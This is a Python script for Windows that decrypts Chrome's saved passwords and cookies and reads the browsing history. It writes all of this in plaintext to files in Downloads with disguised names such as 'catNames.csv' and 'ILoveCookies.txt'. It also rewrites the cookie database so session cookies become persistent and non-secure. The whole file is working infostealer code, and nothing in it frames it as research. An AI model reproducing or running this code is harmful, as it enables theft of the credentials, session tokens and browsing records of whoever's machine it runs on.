import base64
import csv
import json
import os
import re
import shutil
import sqlite3
import sys
from datetime import datetime, timedelta

import win32crypt  # pip install pywin32
from Crypto.Cipher import AES  # pip install pycryptodome

# Global Constant
CHROME_PATH_LOCAL_STATE = os.path.normpath(
    r"%s\AppData\Local\Google\Chrome\User Data\Local State"
    % (os.environ["USERPROFILE"])
)
CHROME_PATH = os.path.normpath(
    r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ["USERPROFILE"])
)
DOWNLOADS_ORDNER = os.path.join(os.path.expanduser("~"), "Downloads")
DATA_PASSWORD = "catNames.csv"
STORE_PASSWORD = os.path.join(DOWNLOADS_ORDNER, DATA_PASSWORD)
DATA_HISTORY = "ILoveCoffee.txt"
STORE_HISTORY = os.path.join(DOWNLOADS_ORDNER, DATA_HISTORY)
DATA_COOKIES = "ILoveCookies.txt"
STORE_COOKIES = os.path.join(DOWNLOADS_ORDNER, DATA_COOKIES)


# Get passwords inside of chrome
def get_secret_key():
    try:
        # Get secretkey from chrome local state
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(ciphertext, secret_key):
    try:
        # Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        # Get encrypted password by removing suffix bytes (last 16 bits)
        # Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        # Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print("%s" % str(e))
        print(
            "[ERR] Unable to decrypt, Chrome version <80 not supported. Please check."
        )
        return ""


def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome database cannot be found")
        return None


def Main_passwords():
    try:
        # Create Dataframe to store passwords (in Downloads)
        with open(
            STORE_PASSWORD, mode="w", newline="", encoding="utf-8"
        ) as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=",")
            csv_writer.writerow(["index", "url", "username", "password"])
            # Get secret key
            secret_key = get_secret_key()
            # Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [
                element
                for element in os.listdir(CHROME_PATH)
                if re.search("^Profile*|^Default$", element) != None
            ]
            for folder in folders:
                # Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(
                    r"%s\%s\Login Data" % (CHROME_PATH, folder)
                )
                conn = get_db_connection(chrome_path_login_db)
                if secret_key and conn:
                    cursor = conn.cursor()
                    cursor.execute(
                        "SELECT action_url, username_value, password_value FROM logins"
                    )
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if url != "" and username != "" and ciphertext != "":
                            # ilter the initialisation vector & encrypted password from ciphertext
                            # Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(
                                ciphertext, secret_key
                            )
                            print("\nChrome Passwords:")
                            print("Sequence: %d" % (index))
                            print(
                                "URL: %s\nUser Name: %s\nPassword: %s\n"
                                % (url, username, decrypted_password)
                            )
                            print("*" * 50)
                            # Save into CSV
                            csv_writer.writerow(
                                [index, url, username, decrypted_password]
                            )
                    # Close database connection
                    cursor.close()
                    conn.close()
                    # Delete temp login db
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s" % str(e))


# Get password inside of chrome end


# Browser History results
def BrowserHistory_Main(browser="Chrome"):
    if browser.lower() == "chrome":
        # Path to Chrome user data directory
        user_data_path = (
            os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data"
        )
        history_db_path = os.path.join(user_data_path, "Default", "History")
        cookies_db_path = os.path.join(user_data_path, "Default", "Cookies")

        # Attempt to connect to the History database, with a retry mechanism
        attempts = 0
        max_attempts = 3
        while attempts < max_attempts:
            try:
                history_conn = sqlite3.connect(history_db_path)
                history_cursor = history_conn.cursor()
                history_cursor.execute(
                    "SELECT * FROM urls ORDER BY last_visit_time DESC LIMIT 300"
                )
                history_results = history_cursor.fetchall()
                break
            except sqlite3.OperationalError as e:
                print(f"Error accessing history database: {e}. Retrying...")
                attempts += 1

        # Print browser history
        print("\nBrowser History:")
        for row in history_results:
            print(row)
            print("=============================================================")

        # write isnside a txt file
        with open(STORE_HISTORY, "w", encoding="utf-8") as file:
            file.write("Browser history: \n")
            for row in history_results:
                file.write(str(row) + "\n")

        # Close database connections
        history_conn.close()


# end of Browser History results


# Get Cookies from Chrome
def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""


def get_encryption_key():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "Local State",
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove 'DPAPI' str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def GetCookies_main():
    # local sqlite Chrome cookie database path
    db_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "Default",
        "Network",
        "Cookies",
    )
    # copy the file to current directory
    # as the database will be locked if chrome is currently open
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        # copy file when does not exist in the current directory
        shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    # ignore decoding errors
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    # get the cookies from `cookies` table
    cursor.execute(
        """
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
    FROM cookies"""
    )
    # you can also search by domain, e.g thepythoncode.com
    # cursor.execute("""
    # SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
    # FROM cookies
    # WHERE host_key like '%thepythoncode.com%'""")
    # get the AES key
    key = get_encryption_key()
    for (
        host_key,
        name,
        value,
        creation_utc,
        last_access_utc,
        expires_utc,
        encrypted_value,
    ) in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            # already decrypted
            decrypted_value = value
        print("\nCookies:")
        print(
            f"""
        Host: {host_key}
        Cookie name: {name}
        Cookie value (decrypted): {decrypted_value}
        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
        ===============================================================
        """
        )
        # update the cookies table with the decrypted value
        # and make session cookie persistent
        cursor.execute(
            """
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""",
            (decrypted_value, host_key, name),
        )

        # in a txt file
        with open(STORE_COOKIES, "a") as cookiefile:
            cookiefile.write("\nCookies: \n")
            cookiefile.write("\nHost:" + str(host_key) + "\n")
            cookiefile.write("Cookie name:" + str(name) + "\n")
            cookiefile.write("Cookie value (decrypted):" + str(decrypted_value) + "\n")
            cookiefile.write(
                "Creation datetime (UTC):"
                + str(get_chrome_datetime(creation_utc))
                + "\n"
            )
            cookiefile.write(
                "Last acess datetime (UTC):"
                + str(get_chrome_datetime(last_access_utc))
                + "\n"
            )
            cookiefile.write(
                "Expires datetime (UTC):" + str(get_chrome_datetime(expires_utc)) + "\n"
            )
            cookiefile.write(
                "============================================================="
            )
    # commit changes
    db.commit()
    # close connection
    db.close()


# end get Cookies from Chrome

# main functions
if __name__ == "__main__":
    Main_passwords()
    BrowserHistory_Main(browser="Chrome")
    GetCookies_main()
